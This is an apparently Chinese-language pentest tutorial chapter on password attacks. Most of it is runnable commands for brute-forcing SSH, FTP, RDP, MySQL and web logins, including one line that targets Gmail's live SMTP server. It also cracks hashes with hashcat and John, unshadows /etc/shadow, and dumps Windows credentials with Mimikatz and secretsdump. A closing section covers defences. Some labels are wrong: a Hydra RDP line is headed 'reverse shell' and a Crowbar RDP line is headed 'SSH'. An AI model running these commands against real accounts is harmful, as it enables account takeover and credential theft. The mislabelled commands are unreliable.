# Chapter 7: 密码攻击

## 7.1 密码攻击简介

密码攻击是指通过各种手段获取或破解用户密码的攻击方式。

## 7.2 密码攻击类型

### 7.2.1 暴力破解

使用所有可能的字符组合尝试登录。

**工具：Hydra**

```bash
# SSH 暴力破解
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# HTTP POST 暴力破解
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP 暴力破解
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# MySQL 暴力破解
hydra -L users.txt -P passwords.txt 192.168.1.100 mysql

# RDP 暴力破解
hydra -L users.txt -P passwords.txt 192.168.1.100 rdp

# 暴力破解 Gmail
hydra -L users.txt -P passwords.txt smtp.gmail.com smtp
```

### 7.2.2 字典攻击

使用预定义的密码字典进行尝试。

```bash
# 使用字典
hydra -L users.txt -P common-passwords.txt ssh://192.168.1.100

# 社会工程字典
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```

### 7.2.3 社工库攻击

利用泄露的数据库进行攻击。

```bash
# 在社工库中搜索邮箱
grep "user@example.com" leaked_db.txt
```

### 7.2.4 彩虹表攻击

使用预计算的哈希表破解密码。

**工具：RainbowCrack**

```bash
# 生成彩虹表
rtgen md5 ascii 32 7 0 10000 16 0 0

# 破解
rcrack *.rt -h hash
```

### 7.2.5 凭证填充

使用泄露的用户名密码尝试登录多个网站。

## 7.3 密码破解工具

### 7.3.1 Hashcat

**安装：**
```bash
# Kali 已预装
# 或编译安装
git clone https://github.com/hashcat/hashcat.git
cd hashcat && make && make install
```

**常用命令：**

```bash
# MD5 破解
hashcat -m 0 hash.txt passwords.txt

# SHA256 破解
hashcat -m 1400 hash.txt passwords.txt

# bcrypt 破解
hashcat -m 3200 hash.txt passwords.txt

# MySQL 破解
hashcat -m 300 hash.txt passwords.txt

# WPA/WPA2 破解
hashcat -m 2500 handshake.hccapx wordlist.txt

# 暴力模式
hashcat -a 3 hash.txt ?l?l?l?l

# 混合模式
hashcat -a 6 hash.txt wordlist.txt ?d?d?d

# 掩码攻击
hashcat -a 3 -m 0 hash.txt ?u?l?l?l?l?l?l?l
```

**常见哈希类型：**

| 类型 | Hashcat ID | 说明 |
|------|------------|------|
| MD5 | 0 | MD5 哈希 |
| MD4 | 900 | MD4 哈希 |
| SHA1 | 100 | SHA1 哈希 |
| SHA256 | 1400 | SHA256 哈希 |
| SHA512 | 1700 | SHA512 哈希 |
| bcrypt | 3200 | bcrypt 哈希 |
| MySQL | 300 | MySQL 哈希 |
| MSSQL | 1731 | MSSQL 哈希 |
| WPA/WPA2 | 2500 | WiFi 握手 |
| NTLM | 1000 | Windows NTLM |

### 7.3.2 John the Ripper

**安装：**
```bash
# Kali 已预装
# 或编译安装
git clone https://github.com/magnumripper/JohnTheRipper.git
cd JohnTheRipper/src
./configure
make -j4
```

**使用：**

```bash
# 破解 shadow 文件
unshadow /etc/passwd /etc/shadow > crackme.txt
john crackme.txt

# 使用字典
john --wordlist=passwords.txt crackme.txt

# 查看已破解密码
john --show crackme.txt

# 特定格式
john --format=raw-md5 hash.txt
```

### 7.3.3 Hydra

**常用命令：**

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# HTTPS
hydra -L users.txt -P passwords.txt https://example.com sasl

# 反弹 Shell
hydra -L users.txt -P passwords.txt -e nsr 192.168.1.100 rdp
```

### 7.3.4 Medusa

```bash
# SSH
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# FTP
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# HTTP
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M http -m "/login"
```

### 7.3.5 Crowbar

```bash
# SSH
crowbar -b rdp -s 192.168.1.100/32 -U users.txt -C passwords.txt

# VNC
crowbar -b vnc -s 192.168.1.100/32 -C passwords.txt
```

## 7.4 密码字典生成

### 7.4.1 Crunch

```bash
# 基本用法
crunch 6 8

# 指定字符集
crunch 6 8 0123456789

# 输出到文件
crunch 6 8 -o passwords.txt

# 使用字符集
crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha

# 掩码模式
crunch 9 9 -t @@@@@2003

# 组合模式
crunch 4 4 -p word1 word2 word3
```

### 7.4.2 CUPP

社工密码生成工具。

```bash
# 安装
git clone https://github.com/Mebus/cupp.git

# 交互模式
python3 cupp.py -i

# 从 LinkedIn 导入
python3 cupp.py -l linkedin.txt
```

### 7.4.3 SecLists

```bash
# 安装
git clone https://github.com/danielmiessler/SecLists.git

# 使用
hydra -L users.txt -P SecLists/Passwords/Common-Credentials/10-million-password-list.txt
```

### 7.4.4 常见字典位置

```bash
# Kali 字典
/usr/share/wordlists/
├── rockyou.txt
├── fasttrack.txt
├── darkweb2017-top10000.txt
└── SecLists/
```

## 7.5 密码攻击实战

### 7.5.1 SSH 暴力破解

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
```

### 7.5.2 Web 登录暴力破解

```bash
# DVWA 暴力破解
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

### 7.5.3 密码哈希破解

```bash
# 破解 MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# 破解 WPA2
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

### 7.5.4 Windows Hash 获取

```bash
# 使用 Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 使用 Impacket
python3 secretsdump.py domain/user:password@192.168.1.100
```

## 7.6 密码安全

### 7.6.1 密码强度

- 长度至少 12 位
- 包含大小写字母、数字、特殊字符
- 不使用常见密码
- 定期更换密码

### 7.6.2 密码存储

**PHP：**
```php
// 使用 password_hash()
$hash = password_hash($password, PASSWORD_BCRYPT);

// 验证
if (password_verify($password, $hash)) {
    // 登录成功
}
```

**Python：**
```python
import bcrypt

# 加密
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# 验证
if bcrypt.checkpw(password.encode(), hashed):
    # 登录成功
```

### 7.6.3 多因素认证 (MFA)

- 短信验证码
- 邮件验证码
- 硬件令牌 (U2F)
- 生物识别

### 7.6.4 账户锁定

```php
$max_attempts = 5;
$lockout_time = 900; // 15分钟

if ($attempts >= $max_attempts) {
    // 锁定账户
    lockAccount($username);
}
```

### 7.6.5 密码安全总结

| 安全措施 | 说明 |
|----------|------|
| 强密码策略 | 长度+复杂度 |
| 密码哈希 | 使用 bcrypt/scrypt |
| 账户锁定 | 防止暴力破解 |
| 多因素认证 | 二次验证 |
| 定期更换 | 降低风险 |
| 密码检查 | Have I Been Pwned |

## 7.7 防御密码攻击

### 7.7.1 限制登录尝试

```php
// 登录失败次数限制
$max_attempts = 5;
$lockout_time = 900; // 15分钟

if (isLocked($username)) {
    $remaining = getLockoutTime($username);
    die("账户已锁定，请 {$remaining} 秒后重试");
}

if (loginFailed($username)) {
    incrementFailedAttempts($username);
    if (getFailedAttempts($username) >= $max_attempts) {
        lockAccount($username, $lockout_time);
    }
}
```

### 7.7.2 使用 CAPTCHA

```php
// 验证 CAPTCHA
if (!verifyCaptcha($_POST['captcha'])) {
    die('验证码错误');
}
```

### 7.7.3 IP 限制

```php
// 限制 IP 登录尝试
$max_attempts_per_ip = 50;
$ip = $_SERVER['REMOTE_ADDR'];

if (getIpAttempts($ip) > $max_attempts_per_ip) {
    die("IP 被限制访问");
}
```

### 7.7.4 双因素认证

```php
// 发送验证码
$code = generateCode();
sendSMS($phone, $code);
$_SESSION['sms_code'] = $code;

// 验证
if ($_POST['code'] === $_SESSION['sms_code']) {
    // 验证通过
}
```
